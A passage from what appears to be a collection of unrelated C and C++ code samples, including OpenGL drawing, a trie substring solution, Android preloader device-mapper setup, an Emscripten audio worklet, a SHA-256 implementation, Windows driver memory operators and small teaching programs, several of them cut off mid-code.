float radius,float r,float g,float b, bool wheel)\n{\n    int triangleAmount = 100; //# of triangles used to draw circle\n\n    GLfloat twicePi = 2.0f * PI;\n    glColor3ub(r, g, b); // Set color\n    glBegin(GL_LINE_LOOP);\n    glVertex2f(x, y); // center of circle\n    for(int i = 0; i <= triangleAmount; i++)\n    {\n        glVertex2f(x + (radius * cos(i *  twicePi / triangleAmount)), y + (radius * sin(i * twicePi / triangleAmount)));\n    }\n    glEnd();\n\n    if(wheel)\n    {\n        // Draw spokes\n        int spokeCount=6;\n        glColor3f(0.0f, 0.0f, 0.0f); // Set color for spokes\n        for (int i = 0; i < spokeCount; i++)\n        {\n            float angle = i * twicePi / spokeCount;\n            float spokeX = x + radius * cos(angle);\n            float spokeY = y + radius * sin(angle);\n\n            glLineWidth(1);\n            glBegin(GL_LINES);\n            glVertex2f(x, y); // Center\n            glVertex2f(spokeX, spokeY); // Edge\n            glEnd();\n        }\n    }\n}\n\n\nvoid sunF() //id: sun01\n{\n\tcircle(41.3442765028296, 137.9994808076247,6.0924722999061,255,255,0,false);\n}\n\nvoid cloud()\n{\n    glMatrixMode(GL_MODELVIEW);\n    glPushMatrix();\n    glTranslatef(_cloudF,-5.0f,0.0f);\n    circle(65.9870963742559, 135.632461771416,4,203, 203, 203,false);\n    circle(70, 138,4.60,203, 203, 203,false);\n    circle(75, 136,2.365,203, 203, 203,false);\n    circle(77.7640621979834, 135.0747681300278, 1.609,203, 203, 203,false);\n    circle(78.1089466040681, 134.9522107337552,3,203, 203, 203,false);\n    circle(80.6317891115194, 134.356686135691,1.81,203, 203, 203,false);\n    glPopMatrix();\n\n}\nvoid cloud2()\n{\n    cloud();\n\n    glMatrixMode(GL_MODELVIEW);\n    glPushMatrix();\n    glTrans",
    "/*\nString Matching in an Array\nGiven an array of string words, return all strings in words that is a substring of another word. You can return the answer in any order.\nA substring is a contiguous sequence of characters within a string\n*/\nclass Solution {\npublic:\n    vector<string> stringMatching(vector<string>& words) {\n        vector<string> matchingWords;\n        TrieNode* root = new TrieNode();\n\n        for (const auto& word : words) {\n            for (int startIndex = 0; startIndex < word.size(); startIndex++) {\n                // Insert each suffix starting from index `startIndex`.\n                insertWord(root, word.substr(startIndex));\n            }\n        }\n\n        // Check each word to see if it exists as a substring in the Trie.\n        for (auto word : words) {\n            if (isSubstring(root, word)) {\n                matchingWords.push_back(word);\n            }\n        }\n\n        return matchingWords;\n    }\n\nprivate:\n    class TrieNode {\n    public:\n        int frequency;\n        unordered_map<char, TrieNode*> childNodes;\n    };\n\n    void insertWord(TrieNode* root, const string& word) {\n        TrieNode* currentNode = root;\n        for (char c : word) {\n            // If the character already exists as a child node, move to it.\n            if (currentNode->childNodes.find(c) !=\n                currentNode->childNodes.end()) {\n                currentNode = currentNode->childNodes[c];\n                // Increment the frequency of the node.\n                currentNode->frequency++;\n            } else {\n                // If the character does not exist, create a new node.\n                TrieNode* newNode = new TrieNode();\n                // Initialize the frequency to 1.\n                newNode->frequency = 1;\n                currentNode->childNodes[c] = newNode;\n                currentNode = newNode;  // Move to the new node.\n            }\n        }\n    }\n\n    bool isSubstring(TrieNode* root, string& word) {\n        TrieNode* currentNode = root;\n        for (char c : word) {\n            currentNode = currentNode->childNodes[c];\n        }\n        return currentNode->frequency > 1;\n    }\n};",
    "#include <fcntl.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <sys/ioctl.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <time.h>\n#include <unistd.h>\n\n#include <chrono>\n#include <ctime>\n#include <iostream>\n#include <map>\n#include <thread>\n\n#include <android-base/file.h>\n#include <android-base/strings.h>\n#include <android-base/unique_fd.h>\n#include <log/log.h>\n#include <libdm/dm.h>\n\nusing namespace std::literals::string_literals;\nusing namespace android::dm;\n\n#define NAME_PL_A  \"pl_a\"\n#define NAME_PL_B  \"pl_b\"\n#define EMMC_PL_A  \"/dev/block/mmcblk0boot0\"\n#define EMMC_PL_B  \"/dev/block/mmcblk0boot1\"\n#define EMMC_DEV   \"/sys/class/block/mmcblk0boot0/uevent\"\n#define UFS_PL_A   \"/dev/block/sda\"\n#define UFS_PL_B   \"/dev/block/sdb\"\n#define UFS_DEV    \"/sys/class/block/sda/uevent\"\n#define LINK_PL_A  \"/dev/block/by-name/preloader_raw_a\"\n#define LINK_PL_B  \"/dev/block/by-name/preloader_raw_b\"\n#define LINK1_PL_A \"/dev/block/platform/bootdevice/by-name/preloader_raw_a\"\n#define LINK1_PL_B \"/dev/block/platform/bootdevice/by-name/preloader_raw_b\"\n#define DM_BLK_SIZE (512)\n\n#define PLHEAD    \"MMM\"\n#define UFSHEAD   \"UFS\"\n#define EMMCHEAD  \"EMMC\"\n#define COMBOHEAD \"COMB\"\n#define EMMCHSZ   (0x800)\n#define UFSHSZ    (0x1000)\n#define BLKSZ     (512)\n\nstatic int create_dm(const char *device, const char *name, std::string *path, int start_blk, int blk_cnt) {\n    DmTable table;\n    std::unique_ptr<DmTarget> target;\n\n    if (!device || !name) {\n        ALOGE(\"%s device or name is null\\n\", __func__);\n        return 1;\n    }\n\n    ALOGI(\"create_dm dev: %s, name %s, start %d, blks %d\\n\", device, name, start_blk, blk_cnt);\n    target = std::make_unique<DmTargetLinear>(0, blk_cnt, device, start_blk);\n    if (!table.AddTarget(std::move(target))) {\n        ALOGE(\"Add target fail(%s)\", strerror(errno));\n        return 1;\n    }\n    DeviceMapper& dm = DeviceMapper::Instance();\n    if (!dm.CreateDevice(name, table, path, std::chrono::milliseconds(500))) {\n        ALOGE(\"Create %s on %s fail(%s)\", name, device, strerror(errno));\n        return 1;\n    }\n    ALOGI(\"Create %s done\", (*path).c_str());\n    return 0;\n}\n\nstatic void create_pl_link(std::string link, std::string devpath)\n{\n    std::string link_path;\n\n    if (android::base::Readlink(link, &link_path) && link_path != devpath) {\n        ALOGE(\"Remove symlink %s links to: %s\", link.c_str(), link_path.c_str());\n        if (!android::base::RemoveFileIfExists(link))\n            ALOGE(\"Cannot remove symlink %s\", strerror(errno));\n    }\n\n    if (symlink(devpath.c_str(), link.c_str()))\n        ALOGE(\"Failed to symlink %s to %s (%s)\", devpath.c_str(), link.c_str(), strerror(errno));\n}\n\nvoid create_pl_path(void) {\n    int start_blk, blk_cnt, fd, isEmmc;\n    off_t pl_size;\n    char header_desc[5];\n    std::string path_a, path_b, link_path, dev_path, link;\n    DeviceMapper& dm = DeviceMapper::Instance();\n    ssize_t sz = 0;\n\n    if (!access(EMMC_DEV, F_OK)) {\n        isEmmc = 1;\n        fd = open(EMMC_PL_A, O_RDONLY);\n    } else {\n        isEmmc = 0;\n        fd = open(UFS_PL_A, O_RDONLY);\n    }\n    if (fd < 0) {\n        ALOGE(\"Cannot open %s (%s)\", isEmmc ? EMMC_PL_A : UFS_PL_A, strerror(errno));\n        return;\n    }\n\n    pl_size = lseek(fd, 0, SEEK_END);\n    if (pl_size < 0) {\n        ALOGE(\"lseek fail (%s)\", strerror(errno));\n        close(fd);\n        return;\n    }\n    ALOGE(\"isEmmc = %d, pl_size: %ld\\n\", isEmmc, pl_size);\n    blk_cnt = pl_size/DM_BLK_SIZE;\n\n    if (lseek(fd, 0, SEEK_SET)) {\n        ALOGE(\"lseek to head fail(%s)\\n\", strerror(errno));\n        close(fd);\n        return;\n    }\n    if ((sz = read(fd, header_desc, sizeof(header_desc))) < 0) {\n        ALOGE(\"read fail(%s)\", strerror(errno));\n        close(fd);\n        return;\n    }\n    if (sz != sizeof(header_desc))\n        ALOGE(\"%s size is not header_desc\\n\", __func__);\n    close(fd);\n\n    header_desc[sizeof(header_desc)-1] = 0;\n    if (!strncmp(header_desc, EMMCHEAD, strlen(EMMCHEAD))) {\n        start_blk = EMMCHSZ/BLKSZ;\n    } else if (!strncmp(header_desc, UFSHEAD, strlen(UFSHEAD))\n        || !strncmp(header_desc, COMBOHEAD, strlen(COMBOHEAD))) {\n        start_blk = UFSHSZ/BLKSZ;\n    } else {\n        ALOGE(\"Invalid header %s\", header_desc);\n        return;\n    }\n    blk_cnt -= start_blk;\n    if (isEmmc) {\n        if (create_dm(EMMC_PL_A, NAME_PL_A, &path_a, start_blk, blk_cnt) != 0) {\n            return;\n        }\n        if (create_dm(EMMC_PL_B, NAME_PL_B, &path_b, start_blk, blk_cnt) != 0) {\n            if (dm.DeleteDevice(NAME_PL_A))\n                ALOGE(\"Cannot delete device %s (%s)\", NAME_PL_A, strerror(errno));\n            return;\n        }\n    } else {\n        if (create_dm(UFS_PL_A, NAME_PL_A, &path_a, start_blk, blk_cnt) != 0) {\n            return;\n        }\n        if (create_dm(UFS_PL_B, NAME_PL_B, &path_b, start_blk, blk_cnt) != 0) {\n            if (dm.DeleteDevice(UFS_PL_A))\n                ALOGE(\"Cannot delete device %s (%s)\", NAME_PL_A, strerror(errno));\n            return;\n        }\n    }\n\n    creat",
    "/**\n * helpful source:\n * <https://github.com/tomduncalf/emscripten-audio-worklet-example/blob/main/c%2B%2B/oscillator.cpp>\n */\n\n#include <emscripten/webaudio.h>\n\n// -------------------------------------------------------------\n// Utility Types\n// -------------------------------------------------------------\n\n/** JavaScript function handle (callback). */\ntypedef void (*js_cb_t)(int data);\n\n// -------------------------------------------------------------\n// API Prototypes\n// -------------------------------------------------------------\n\n// --- Public\n\nextern \"C\" {\nvoid create_node(EMSCRIPTEN_WEBAUDIO_T audio_context, uint32_t sample_rate,\n                 js_cb_t handle_node);\n}\n\n// --- Private\n\nvoid create_node_step_1(EMSCRIPTEN_WEBAUDIO_T audio_context, EM_BOOL success,\n                        void *handle_node);\n\nvoid create_node_step_2(EMSCRIPTEN_WEBAUDIO_T audio_context, EM_BOOL success,\n                        void *handle_node);\n\nEM_BOOL process(int input_count, const AudioSampleFrame *inputs,\n                int output_count, AudioSampleFrame *outputs, int param_count,\n                const AudioParamFrame *params, void *data);\n\n// -------------------------------------------------------------\n// Settings\n// -------------------------------------------------------------\n\n/** AudioWorkletProcessor registration name. */\nconst char *AWP_NAME = \"my-reference-processor\";\n\n/** Amount of stack space allocated to audio worklet thread. */\nconst int AUDIO_THREAD_STACKSIZE = 4096;\n\n// -------------------------------------------------------------\n// Static Data\n// -------------------------------------------------------------\n\n/** Stack space used by audio worklet thread. */\nuint8_t audio_thread_stack[AUDIO_THREAD_STACKSIZE];\n\n// -------------------------------------------------------------\n// Audio Parameters\n// -------------------------------------------------------------\n\nWebAudioParamDescriptor params[] = {\n#define PARAM_GAIN 0\n    {.defaultValue = 1.0f,\n     .minValue = 0.0f,\n     .maxValue = 2.0f,\n     .automationRate = WEBAUDIO_PARAM_A_RATE}\n#define PARAM_COUNT 1\n};\n\nWebAudioWorkletProcessorCreateOptions AWP_OPTIONS = {\n    .name = AWP_NAME,\n    .numAudioParams = PARAM_COUNT,\n    .audioParamDescriptors = params};\n\n// -------------------------------------------------------------\n// Public API (JS-Exported Functions)\n// -------------------------------------------------------------\n\nextern \"C\" {\n\n/**\n * Create AudioWorkletNode \"Step 0\".\n *\n * Starts a new audio worklet thread and calls step 1 handler function from\n * inside it.\n */\nEMSCRIPTEN_KEEPALIVE void create_node(EMSCRIPTEN_WEBAUDIO_T audio_context,\n                                      uint32_t sample_rate,\n                                      js_cb_t handle_node) {\n  emscripten_start_wasm_audio_worklet_thread_async(\n      audio_context, audio_thread_stack, AUDIO_THREAD_STACKSIZE,\n      create_node_step_1, (void *)handle_node);\n}\n} // extern \"C\"\n\n// -------------------------------------------------------------\n// Node Construction Stages\n// -------------------------------------------------------------\n\n/**\n * Create and register AudioWorkletProcessor in dedicated audio thread.\n */\nvoid create_node_step_1(EMSCRIPTEN_WEBAUDIO_T audio_context, EM_BOOL success,\n                        void *handle_node) {\n\n  if (!success) {\n    return;\n  }\n\n  emscripten_create_wasm_audio_worklet_processor_async(\n      audio_context, &AWP_OPTIONS, create_node_step_2, handle_node);\n}\n\n/**\n * Create AudioWorkletNode and invoke with handler callback.\n */\nvoid create_node_step_2(EMSCRIPTEN_WEBAUDIO_T audio_context, EM_BOOL success,\n                        void *handle_node) {\n\n  if (!success) {\n    return;\n  }\n\n  int output_channel_counts[] = {1};\n  EmscriptenAudioWorkletNodeCreateOptions options{\n      .numberOfInputs = 1,\n      .numberOfOutputs = 1,\n      .outputChannelCounts = output_channel_counts,\n  };\n\n  EMSCRIPTEN_AUDIO_WORKLET_NODE_T node =\n      emscripten_create_wasm_audio_worklet_node(audio_context, AWP_NAME,\n                                                &options, process, handle_node);\n\n  ((js_cb_t)(handle_node))(node);\n}\n\n/**\n * Process audio block.\n */\nEM_BOOL process(int input_count, const AudioSampleFrame *inputs,\n                int output_count, AudioSampleFrame *outputs, int param_count,\n                const AudioParamFrame *params, void *data) {\n  const float gain = params[PARAM_GAIN].data[0];\n  for (int index = 0; index < outputs[0].samplesPerChannel; ++index) {\n    outputs[0].data[index] = inputs[0].data[index] * gain;\n  }\n  return true;\n}\n",
    "#include<bits/stdc++.h>\n#include\"parkingLot.h\"\n#include\"vehicle/vehicle.h\"\n#include\"vehicle/car.h\"\n#include\"vehicle/bike.h\"\n#include\"vehicle/truck.h\"\nusing namespace std;\n\nint main(){\n    auto parkingLot = make_unique<ParkingLot>(2, 3);\n    vector<unique_ptr<Vehicle>> vehicles;\n\n    vehicles.push_back(make_unique<Car>(\"Honda\", 4));\n    vehicles.push_back(make_unique<Car>(\"BMW\", 4));\n    vehicles.push_back(make_unique<Car>(\"Toyota\", 4));\n    vehicles.push_back(make_unique<Bike>(\"Hero\", 2));\n    vehicles.push_back(make_unique<Bike>(\"Bajaj\", 4));\n    vehicles.push_back(make_unique<Truck>(\"Tata\", 16));\n\n    cout << \"\\n\\nNow parking vehicles\\n\\n\";\n    for(int i=0;i<vehicles.size();i++){\n        pair<int,int> ticket = parkingLot->park(vehicles[i]);\n        cout << \"Parked at floor: \" << ticket.first << \", spot: \" << ticket.second << \"\\n\";\n    }\n\n    cout << \"\\n\\nNow unparking vehicles\\n\\n\";\n    vehicles.clear();\n    parkingLot->unpark(make_pair(0, 0));\n    vehicles.push_back(make_unique<Truck>(\"Peterbilt\", 18));\n    for(int i=0;i<vehicles.size();i++){\n        pair<int,int> ticket = parkingLot->park(vehicles[i]);\n        cout << \"Parked at floor: \" << ticket.first << \", spot: \" << ticket.second << \"\\n\";\n    }\n\n    cout << \"\\n\\nFreeing up memory\\n\\n\";\n    // Clean up\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <math.h>\n#include <fcntl.h>\n\n#define uint8_t unsigned char\n#define uint32_t unsigned int\n#define uint64_t unsigned long long\n#define BLOCK_SIZE 64  // 512 bits = 64 bytes\n#define BYTE unsigned char\n\n//\u4e3a\u4ec0\u4e48\u7528int\u4e0d\u884c\uff1f\nsize_t bitlen=0;\nsize_t datalen=0;\nstatic const uint32_t K[64] = {\n    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,\n    0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,\n    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,\n    0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,\n    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,\n    0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,\n    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,\n    0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,\n    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,\n    0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,\n    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,\n    0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,\n    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,\n    0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,\n    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,\n    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2\n};\n\n// \u521d\u59cb\u54c8\u5e0c\u503c\nconst uint32_t H0[8] = {\n    0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,\n    0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19\n};\n\n// \u53f3\u65cb\u8f6c\nuint32_t rotr(uint32_t x, uint32_t n) {\n    return (x >> n) | (x << (32 - n));\n}\n\n// SHA-256\u538b\u7f29\u51fd\u6570\nvoid sha256_compress(uint32_t *state,const uint8_t *block) {\n    uint32_t W[64];\n    uint32_t a, b, c, d, e, f, g, h, t1, t2;\n\n    // \u6d88\u606f\u8c03\u5ea6\n    for (int t = 0; t < 16; t++) {\n        W[t] = (block[t * 4] << 24) | (block[t * 4 + 1] << 16) | (block[t * 4 + 2] << 8) | block[t * 4 + 3];\n    }\n    for (int t = 16; t < 64; t++) {\n        W[t] = W[t - 16] + (rotr(W[t - 15], 7) ^ rotr(W[t - 15], 18) ^ (W[t - 15] >> 3)) + W[t - 7] + (rotr(W[t - 2], 17) ^ rotr(W[t - 2], 19) ^ (W[t - 2] >> 10));\n    }\n\n    // \u521d\u59cb\u5316\u5de5\u4f5c\u53d8\u91cf\n    a = state[0];\n    b = state[1];\n    c = state[2];\n    d = state[3];\n    e = state[4];\n    f = state[5];\n    g = state[6];\n    h = state[7];\n\n    // \u4e3b\u5faa\u73af\n    for (int t = 0; t < 64; t++) {\n        t1 = h + (rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25)) + ((e & f) ^ ((~e) & g)) + K[t] + W[t];\n        t2 = (rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)) + ((a & b) ^ (a & c) ^ (b & c));\n        h = g;\n        g = f;\n        f = e;\n        e = d + t1;\n        d = c;\n        c = b;\n        b = a;\n        a = t1 + t2;\n    }\n\n    // \u66f4\u65b0\u72b6\u6001\n    state[0] += a;\n    state[1] += b;\n    state[2] += c;\n    state[3] += d;\n    state[4] += e;\n    state[5] += f;\n    state[6] += g;\n    state[7] += h;\n}\n\n\n// SHA-256\u4e3b\u51fd\u6570\n// void sha256(const uint8_t *message, size_t length, uint8_t *digest) {\n//     uint32_t state[8];\n//     memcpy(state, H0, sizeof(H0));\n\n//     for (size_t i = 0; i < length; i += BLOCK_SIZE) {\n//         sha256_compress(state, &message[i]);\n//     }\n\n//     // \u8f93\u51fa\u6458\u8981\n//     for (int i = 0; i < 8; i++) {\n//         digest[i * 4] = (state[i] >> 24) & 0xFF;\n//         digest[i * 4 + 1] = (state[i] >> 16) & 0xFF;\n//         digest[i * 4 + 2] = (state[i] >> 8) & 0xFF;\n//         digest[i * 4 + 3] = state[i] & 0xFF;\n//     }\n// }\n\nvoid process_block(const uint8_t *block) {\n    // \u8fd9\u91cc\u5904\u7406\u6bcf\u4e2a512\u4f4d\u7684\u5757\n    // \u4f8b\u5982\uff0c\u53ef\u4ee5\u8c03\u7528SHA-256\u7684\u6838\u5fc3\u7b97\u6cd5\n    // \u8fd9\u91cc\u53ea\u662f\u4e00\u4e2a\u5360\u4f4d\u7b26\n    printf(\"Processing block:\\n\");\n    for (int i = 0; i < BLOCK_SIZE; i++) {\n        printf(\"%02x \", block[i]);\n        if(i % 8 ==7){\n            printf(\"\\n\");\n        }\n    }\n    printf(\"\\n\");\n}\n\nvoid sha256_padding(int file_size, uint8_t *buffer, size_t *buffer_len) {\n    // \u8ba1\u7b97\u6587\u4ef6\u7684\u603b\u957f\u5ea6\uff08\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\uff09     \n    \n    // \u8ba1\u7b97\u586b\u5145\u540e\u7684\u603b\u957f\u5ea6\n    size_t total_bits = file_size * 8;\n    size_t padding_bits = 448 - (total_bits % 512);\n    if (padding_bits <= 0) {\n        padding_bits += 512;\n    }\n    size_t padding_bytes = padding_bits / 8;\n\n    // \n    size_t bytes_read = file_size%BLOCK_SIZE;\n    \n    // fread(buffer, 1, bytes_read, file);\n    // \u5728\u672b\u5c3e\u6dfb\u52a0\u4e00\u4e2a1\n    buffer[bytes_read] = 0x80;\n    bytes_read++;\n\n    // \u586b\u51450\u76f4\u5230\u8fbe\u5230512\u4f4d\u7684\u500d\u6570\n    for (size_t i = bytes_read; i < BLOCK_SIZE - 8; i++) {\n        buffer[i] = 0x00;\n    }\n\n    // \u6dfb\u52a0\u539f\u59cb\u6d88\u606f\u7684\u957f\u5ea6\uff0864\u4f4d\uff09\n    uint64_t original_length = total_bits;\n    for (int i = 0; i < 8; i++) {\n        buffer[BLOCK_SIZE -8 + i] = (original_length >> (56 - i * 8)) & 0xFF;\n    }\n\n    *buffer_len = file_size + padding_bytes;\n}\n\n\nvoid sha256_update(BYTE data[], uint32_t state[],  uint8_t buffer[],size_t len)\n{\n\tint i;\n\n\tfor (i = 0; i < len; ++i) {\n\t\tbuffer[datalen] = data[i];\n\t\tdatalen++;\n\t\tif (datalen == 64) {\n\t\t\t// sha256_transform(ctx, ctx->data);\n\t\t\tsha256_compress(state, buffer);\n\t\t\tbitlen += 512;\n\t\t\tdatalen = 0;\n\t\t}\n\t}\n}\n\n\nvoid sha256_final(BYTE data[], uint32_t state[], BYTE digest[])\n{\n\tint i;\n\n\ti = datalen;\n    \n\n\n\t// Pad whatever data is left in the buffer.\n\tif (datalen < 56) {\n\t\tdata[i++] = 0x80;\n\t\twhile (i < 56)\n\t\t\tdata[i++] = 0x00;\n\t}\n\telse {\n\t\tdata[i++] = 0x80;\n\t\twhile (i < 64)\n\t\t\tdata[i++] = 0x00;\n\n\t\tsha256_compress(state, data);\n\t\tmemset(data, 0, 56);\n\t}\n\n\t// Append to the padding the tota",
    "/*\n * Copyright 2025 Mustafa Yemural(myemural)\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *   http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"kubecpp/model/internal/common/resource_requirements.h\"\n\n#include \"kubecpp/common/json_utils.h\"\n\nnamespace kubecpp::model::internal::common\n{\n\nstd::string ResourceClaim::ParseToJson() const\n{\n    return ParseFieldsToJson(Name, Request);\n}\n\nResourceClaim ResourceClaim::ParseFromJson(const std::string& jsonData)\n{\n    ResourceClaim result;\n    ParseFieldsFromJson(jsonData, result.Name, result.Request);\n    return result;\n}\n\nstd::string ResourceRequirements::ParseToJson() const\n{\n    return ParseFieldsToJson(Claims, Limits, Requests);\n}\n\nResourceRequirements ResourceRequirements::ParseFromJson(const std::string& jsonData)\n{\n    ResourceRequirements result;\n    ParseFieldsFromJson(jsonData, result.Claims, result.Limits, result.Requests);\n    return result;\n}\n\n} // namespace kubecpp::model::internal::common",
    "/*****************************************************************************\n* NewDelete.cpp -  CPP placement new and delete operators implementation\n*****************************************************************************\n* Copyright (c) Microsoft Corporation All Rights Reserved\n*\n* Module Name:\n*\n* NewDelete.cpp\n*\n* Abstract:\n*\n*   Definition of placement new and delete operators.\n*\n*/\n\n#ifdef _NEW_DELETE_OPERATORS_\n#ifdef __cplusplus\nextern \"C\" {\n#include <wdm.h>\n}\n#else\n#include <wdm.h>\n#endif\n\n#include \"newDelete.h\"\n#include \"definitions.h\"\n\n#pragma code_seg()\n/*****************************************************************************\n* Functions\n*/\n\n/*****************************************************************************\n* ::new()\n*****************************************************************************\n* New function for creating objects with a specified allocation tag.\n*/\nPVOID operator new\n(\n    size_t      iSize,\n    POOL_FLAGS  poolFlags,\n    ULONG       tag\n)\n{\n    PVOID result = ExAllocatePool2(poolFlags, iSize, tag);\n\n    return result;\n}\n\n\n/*****************************************************************************\n* ::new()\n*****************************************************************************\n* New function for creating objects with a specified allocation tag.\n*/\nPVOID operator new\n(\n    size_t      iSize,\n    POOL_FLAGS  poolFlags\n)\n{\n    PVOID result = ExAllocatePool2(poolFlags, iSize, SIMPLEAUDIOSAMPLE_POOLTAG);\n\n    return result;\n}\n\n\n/*****************************************************************************\n* ::delete()\n*****************************************************************************\n* Delete with tag function.\n*/\nvoid __cdecl operator delete\n(\n    PVOID pVoid,\n    ULONG tag\n)\n{\n    if (pVoid)\n    {\n        ExFreePoolWithTag(pVoid, tag);\n    }\n}\n\n\n/*****************************************************************************\n* ::delete()\n*****************************************************************************\n* Sized Delete function.\n*/\nvoid __cdecl operator delete\n(\n    _Pre_maybenull_ __drv_freesMem(Mem) PVOID pVoid,\n    _In_ size_t cbSize\n)\n{\n    UNREFERENCED_PARAMETER(cbSize);\n\n    if (pVoid)\n    {\n        ExFreePoolWithTag(pVoid, SIMPLEAUDIOSAMPLE_POOLTAG);\n    }\n}\n\n\n/*****************************************************************************\n* ::delete()\n*****************************************************************************\n* Sized Array Delete function.\n*/\nvoid __cdecl operator delete[]\n(\n    _Pre_maybenull_ __drv_freesMem(Mem) PVOID pVoid,\n    _In_ size_t cbSize\n)\n{\n    UNREFERENCED_PARAMETER(cbSize);\n\n    if (pVoid)\n    {\n        ExFreePoolWithTag(pVoid, SIMPLEAUDIOSAMPLE_POOLTAG);\n    }\n}\n\n\n/*****************************************************************************\n* ::delete()\n*****************************************************************************\n* Array Delete function.\n*/\nvoid __cdecl operator delete[]\n(\n    _Pre_maybenull_ __drv_freesMem(Mem) PVOID pVoid\n)\n{\n    if (pVoid)\n    {\n        ExFreePoolWithTag(pVoid, SIMPLEAUDIOSAMPLE_POOLTAG);\n    }\n}\n#endif//_NEW_DELETE_OPERATORS_\n",
    "#include <iostream>\n#include <cstdlib>\nusing namespace std;\n\nclass stack {\nprivate:\n    static const int STACK_SIZE = 128;\n    int _stack[STACK_SIZE];\n    int _top;\n\npublic:\n    stack();\n    void push(int);\n    int pop();\n    int top();\n    bool is_empty();\n};\n\n// Constructor\nstack::stack() : _top(-1) {}\n\nvoid stack::push(int value) {\n    if (_top >= STACK_SIZE - 1) {\n        cerr << \"Stack overflow\" << endl;\n        return;\n    }\n    _stack[++_top] = value;\n}\n\nint stack::pop() {\n    if (is_empty()) {\n        cerr << \"Stack underflow\" << endl;\n        return -1; // Return an invalid value\n    }\n    return _stack[_top--];\n}\n\nint stack::top() {\n    if (is_empty()) {\n        cerr << \"Stack is empty\" << endl;\n        return -1; // Return an invalid value\n    }\n    return _stack[_top];\n}\n\nbool stack::is_empty() {\n    return _top == -1;\n}\n\nint main() {\n    stack s;\n    int num;\n\n    cout << \"Enter a number (or any non-number to exit): \";\n    while (cin >> num) {\n        s.push(num);\n        cout << \"Top element: \" << s.top() << endl;\n        cout << \"Enter another number  (type a non-number to exit): \";\n    }\n\n    // Display the final stack contents\n    cout << \"\\n Final stack contents (from top to bottom):\" << endl;\n    while (!s.is_empty()) {\n        cout << s.pop() << \" \";\n    }\n    cout << endl;\n\n    cout << \"Done.\" << endl;\n    return 0;\n}",
    "#ifndef __PROGTEST__\n#include <cassert>\n#include <iomanip>\n#include <cstdint>\n#include <iostream>\n#include <memory>\n#include <limits>\n#include <optional>\n#include <algorithm>\n#include <bitset>\n#include <list>\n#include <array>\n#include <vector>\n#include <deque>\n#include <unordered_set>\n#include <unordered_map>\n#include <set>\n#include <map>\n#include <stack>\n#include <queue>\n#include <random>\n#include <type_traits>\n#include <compare>\n\nenum struct Direction {\n    UP, DOWN, LEFT, RIGHT\n};\n\nstruct Position {\n    size_t row = -1, col = -1;\n\n    constexpr Position() = default;\n    constexpr Position(size_t r, size_t c) : row(r), col(c) {}\n\n    Position move(Direction d) const {\n        using enum Direction;\n        switch (d) {\n            case UP:    return { row - 1, col };\n            case DOWN:  return { row + 1, col };\n            case LEFT:  return { row, col - 1 };\n            case RIGHT: return { row, col + 1 };\n        }\n        assert(0);\n    }\n\n    friend constexpr auto operator <=> (Position, Position) = default;\n};\n\nenum struct Tile : uint8_t {\n    WALL, EMPTY, TRAP\n};\n\nstruct Map {\n    static inline constexpr Position INVALID_POS = { -size_t(1), -size_t(1) };\n\n    std::vector<std::vector<Tile>> tiles;\n    Position hero = INVALID_POS, beast = INVALID_POS;\n    Position exit = INVALID_POS;\n\n\n    Map() = default;\n    Map(std::string_view s) {\n        tiles.emplace_back();\n\n        auto set_pos = [&](Position& p, const char *err_msg) {\n            if (p != INVALID_POS) throw std::invalid_argument(err_msg);\n            p = { tiles.size() - 1, tiles.back().size() };\n            tiles.back().push_back(Tile::EMPTY);\n        };\n\n        for (char c : s) switch (c) {\n                case 'H': set_pos(hero, \"Multiple heroes\");\n                    break;\n                case 'B': set_pos(beast, \"Multiple beasts\");\n                    break;\n                case 'E': set_pos(exit, \"Multiple exits\");\n                    break;\n                case ' ': tiles.back().push_back(Tile::EMPTY);\n                    break;\n                case 'W': tiles.back().push_back(Tile::WALL);\n                    break;\n                case 'T': tiles.back().push_back(Tile::TRAP);\n                    break;\n                case '\\n': tiles.emplace_back();\n                    break;\n                default:\n                    throw std::invalid_argument(\"Unknown tile\");\n            }\n\n        if (hero == INVALID_POS) throw std::invalid_argument(\"No hero\");\n        if (beast == INVALID_POS) throw std::invalid_argument(\"No beast\");\n        if (exit == INVALID_POS) throw std::invalid_argument(\"No exit\");\n\n        for (const auto& row : tiles)\n            if (row.size() != tiles[0].size())\n                throw std::invalid_argument(\"Non-rectangular maze\");\n    }\n\n    // Get tile at given position, WALL if the position is out of map\n    Tile operator [] (Position p) const {\n        if (p.row >= tiles.size()) return Tile::WALL;\n        const auto& row = tiles[p.row];\n        return p.col < row.size() ? row[p.col] : Tile::WALL;\n    }\n};\n\nusing Path = 